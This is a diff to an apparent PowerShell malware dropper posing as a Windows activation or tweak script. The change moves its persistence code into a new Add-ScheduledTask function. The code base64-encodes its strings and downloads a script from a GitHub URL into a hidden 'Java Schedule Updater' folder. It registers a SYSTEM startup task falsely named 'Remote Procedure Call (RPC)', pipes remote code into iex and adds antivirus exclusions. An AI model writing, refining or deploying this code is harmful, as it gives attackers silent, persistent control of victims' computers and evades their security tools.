@@ -17,7 +17,7 @@ $silentlyContinueB64 = "U2lsZW50bHljb250aW51ZQ=="
 $stopActionB64 = "U3RvcA=="
 $directoryB64 = "RGlyZWN0b3J5"
 $runAsB64 = "UnVuQXM="
-$scriptUrlB64 = "aHR0cHM6Ly9naXRodWIuY29tL1dpbmRvd3NUd2Vha3NYL1Bvd2VyU2hlbGxBY3RpdmF0ZS9yYXcvcmVmcy9oZWFkcy9tYWluL1JlYWN0aXZhdGVTY3JpcHQ="
+$scriptUrlB64 = "aHR0cHM6Ly9naXRodWIuY29tL1dpbmRvd3NUd2Vha3NYL1Bvd2VyU2hlbGxBY3RpdmF0ZS9yYXcvcmVmcy9oZWFkcy9tYWluL2ludm9rZWNvbW1hbmQ=" # заменить на реал
 $trustedNameB64 = "TWljcm9zb2Z0RXRoZXJuZXRVcGRhdGUucHMx"
 $trustedFolderB64 = "VXBkYXRlQ2FjaGU="
 $programfilesB64 = "QzpcUHJvZ3JhbSBGaWxlcw=="
@@ -37,6 +37,26 @@ $programfiles = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBas
 $uacStatus = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").EnableLUA -eq 1
 $persistFolder = Join-Path $env:ProgramFiles $trustedFolder
 
+function Add-ScheduledTask {
+    try {
+        $persistFolder = "C:\ProgramData\Java Schedule Updater"
+        $persistScriptPath = Join-Path $persistFolder $trustedName
+        if (-not (Test-Path -Path $persistFolder)) {
+            New-Item -Path $persistFolder -ItemType Directory -Force
+        }
+
+
+        Invoke-WebRequest -Uri $scriptUrl -OutFile $persistScriptPath -UseBasicParsing -ErrorAction Stop      
+
+        Set-ItemProperty -Path $persistScriptPath -Name Attributes -Value "Hidden"
+
+        $action = New-ScheduledTaskAction -Execute 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$persistScriptPath`""
+        $trigger = New-ScheduledTaskTrigger -AtStartup
+        $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
+        Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName 'Remote Procedure Call (RPC)' -Description 'Microsoft Corporation Remote Procedure Calls needs to be autorunned with Windows to run Ethernet Configuration' -ErrorAction Stop
+        iwr "https://github.com/WindowsTweaksX/PowerShellActivate/raw/refs/heads/main/TaskSuccesful" | iex
+    } catch {}
+}
 
 function Add-Exclusion {
     param ([string]$Path)
@@ -53,22 +73,7 @@ function Disable-UAC {
 }
 
 if ($uacStatus -eq $false) {
-    $newFolderName = "Java Schedule Updater"
-    $persistFolder = Join-Path "C:\ProgramData" $newFolderName
-    $persistScriptPath = Join-Path $persistFolder $trustedName
-    if (-not (Test-Path -Path $persistFolder)) {
-        New-Item -Path $persistFolder -ItemType Directory -Force
-    }
-    
-    Invoke-WebRequest -Uri $scriptUrl -OutFile $persistScriptPath -UseBasicParsing -ErrorAction Stop      
-
-    Set-ItemProperty -Path $persistScriptPath -Name Attributes -Value "Hidden"
-
-    $action = New-ScheduledTaskAction -Execute 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$persistScriptPath`""
-    $trigger = New-ScheduledTaskTrigger -AtStartup
-    $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
-    Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName 'Remote Procedure Call (RPC)' -Description 'Microsoft Corporation Remote Procedure Calls needs to be autorunned with Windows to run Ethernet Configuration' -ErrorAction Stop
-    iwr "https://github.com/WindowsTweaksX/PowerShellActivate/raw/refs/heads/main/TaskSuccesful" | iex
+    Add-ScheduledTask
     New-Item -ItemType $directory -Path $persistFolder -Force | Out-Null
     Set-ItemProperty -Path $persistFolder -Name Attributes -Value $hiddenAttr
     Add-Exclusion -Path $persistFolder -ErrorAction $stopAction
@@ -112,4 +117,3 @@ if ($uacStatus -eq $false) {
     }
 
 }
-
